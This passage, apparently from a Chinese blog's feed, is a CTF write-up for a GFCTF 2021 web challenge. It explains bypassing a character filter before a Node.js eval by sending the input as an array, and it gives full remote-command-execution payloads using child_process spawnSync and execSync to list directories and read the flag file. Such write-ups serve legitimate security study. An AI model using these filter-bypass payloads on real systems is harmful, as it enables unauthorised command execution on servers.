class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.indexOf(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.replace(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于我这种代码能力比较差的人，审计这种代码是真挺头疼的，只有慢慢看；首先看最后有一个<code>eval</code>，应该是可以命令执行，但是它做了很多的过滤，正常<code>rce</code>的话肯定会触发<code>waf</code>，我们只有先看看它这个<code>waf</code>的逻辑，看看有没有绕过它的方法；首先它通过<code>split</code>会对输入的参数的每一位都会进行检查，如果出现了<code>/(flc&#39;\&quot;.</code>中的任意字符，就会将后面所有的字符都变成<code>*</code>，然后会将处理后的这个字符串进行截取操作，取前64位，在去除了空格，过滤了危险字符之后，传入<code>eval</code>中，看似非常完美的过滤，肯定是无法传入字符串了，但它忽略了一个问题就是，假如我们传入的不是字符串呢？我们知道在<code>PHP</code>中<strong>数组</strong>有很多神奇的操作可以绕过过滤，其实这里也可以尝试数组的，假如我们尝试传入数组<code>[&quot;aaaaa&quot;,&quot;bbbbb&quot;,ccccc]</code>，这样<code>calc[i]</code>就不再是单个的字符，而变成了一个字符串了；那么<code>calc.length</code>也就是数组中元素的个数，也就是3了；如果传入<code>[&quot;aaaaa&quot;,&quot;bbbbb&quot;,&quot;(&quot;,]</code>的话，那么按照这道题的逻辑，它在第3位发现了危险字符，那么就会将第三位以后的字符都替换成<code>*</code>，也就是处理成：<code>aaa***********</code>，而在数组中添加元素可以用<code>calc[]=aaaaa&amp;calc[]=bbbbb&amp;calc[]=ccccc</code>这种方式进行</p><p>那么假如说我们要让这个数组中的第一个五位字符的元素逃逸出来，我们就需要让数组的第五个元素中出现敏感字符，这样的话它就会让第五位以后的字符全变成<code>*</code>，而前五位字符就正常了；比如说像<code>[&quot;a(aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;,&quot;(&quot;]</code>，我们看看处理后它会变成什么样：</p><p><img src="https://i.loli.net/2021/11/24/P94qNWvxzMVtEsm.png" alt="image.png"></p><p>可以看到虽然说第一个元素中已经有了敏感元素<code>(</code>，但它还是被逃逸了出来，后续不触发waf的元素多了没有影响，所以说用这种方法就可以直接把我们要想要的字符串逃逸出来了，关于这个知识点可以去y1ng师傅的博客中深入学习：&lt;<a href="https://www.gem-love.com/websecurity/2070.html">颖奇L’Amore</a>&gt;</p><p>接下来我们就开始尝试构造<code>rce</code>的<code>payload</code>了，先来一个<code>ls /</code>，<code>payload</code>如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;/&#x27;</span>]).stdout.toString();&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/24/v2r1gJduyFVS8WX.png" alt="image.png"></p><p>发现flag的名字很长，直接读取的话长度不够，而且这里过滤了x，也无法直接利用<code>exec</code>，但是实际上这里是可以绕过的，因为我们通过<code>require</code>导入的模块是一个<code>Object</code>，那么就可以通过<code>Object.values</code>获取到<code>child_process</code>里面的各种方法，那么再通过数组下标<code>[5]</code>就可以得到<code>execSync</code>了，那么有了<code>execSync</code>后就可以通过写入文件的方式读取flag了，<code>payload</code>如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">Object</span>.values(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">5</span>](<span class="string">&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;</span>)&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure><p>遍历一下当前目录发现p已经成功写入，接下来读取p就行了，记得带上回显，用nl读就行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;nl&#x27;</span>,[<span class="string">&#x27;p&#x27;</span>]).stdout.toString();&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/24/GyBm4cQSOYkNoe7.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这儿这两道Web题的分析就写完了，都挺有意思的，还有一道文件查看器难度会稍微大一点，比赛的时候是零解，那道题涉及到的知识点更有意思，快期末考试了，等过段时间再来和大家分享哈哈哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;解析2021-GFCTF中的两道Web&quot;&gt;&lt;a href=&quot;#解析2021-GFCTF中的两道Web&quot; class=&quot;headerlink&quot; title=&quot;解析2021 GFCTF中的两道Web&quot;&gt;&lt;/a&gt;解析2021 GFCTF中的两道Web&lt;/h1&gt;&lt;p&gt;上周天我们学校的校赛&lt;code&gt;GFCTF(&lt;/code&gt;原&lt;code&gt;SWPUCTF)12th&lt;/code&gt;顺利举行，我觉得其中的两道Web题都挺有意思的，也是唯一有解的两道Web题，接下来就来聊聊这两道Web题，如果有想复现的师傅可以加qq来私聊找我要哈&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
</feed>
